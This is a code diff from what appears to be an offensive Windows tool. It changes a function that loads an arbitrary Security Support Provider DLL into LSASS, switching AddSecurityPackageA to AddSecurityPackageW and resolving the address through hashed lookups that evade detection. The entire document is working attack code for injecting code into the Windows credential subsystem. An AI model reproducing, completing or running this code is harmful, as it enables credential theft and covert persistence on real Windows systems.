@@ -8,36 +8,36 @@
 
 void load_ssp(LPSTR ssp_path)
 {
+    AddSecurityPackageW_t AddSecurityPackageW;
+    wchar_t ssp_path_w[MAX_PATH];
+
     if (!is_full_path(ssp_path))
     {
         PRINT_ERR("You must provide a full path: %s", ssp_path);
         return;
     }
-    AddSecurityPackageA_t AddSecurityPackageA;
-    // find the address of AddSecurityPackageA dynamically
-    AddSecurityPackageA = (AddSecurityPackageA_t)get_function_address(
+    DPRINT("Loading %s into " LSASS, ssp_path);
+    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);
+    // find the address of AddSecurityPackageW dynamically
+    AddSecurityPackageW = (AddSecurityPackageW_t)get_function_address(
         get_library_address(SSPICLI_DLL, TRUE),
-        AddSecurityPackageA_SW2_HASH,
+        AddSecurityPackageW_SW2_HASH,
         0
     );
-    if (!AddSecurityPackageA)
+    if (!AddSecurityPackageW)
     {
-        DPRINT_ERR("Address of 'AddSecurityPackageA' not found");
+        DPRINT_ERR("Address of 'AddSecurityPackageW' not found");
         return;
     }
     SECURITY_PACKAGE_OPTIONS spo = {0};
-    NTSTATUS status = AddSecurityPackageA(ssp_path, &spo);
+    NTSTATUS status = AddSecurityPackageW(ssp_path_w, &spo);
     if (status == SEC_E_SECPKG_NOT_FOUND)
     {
-        PRINT("status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n");
-    }
-    else if (status == 0)
-    {
-        PRINT("succesfully loaded the SSP.");
+        PRINT("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n");
     }
     else
     {
-        PRINT("status: 0x%lx\n", status);
+        PRINT("Done, status: 0x%lx\n", status);
     }
     return;
 }
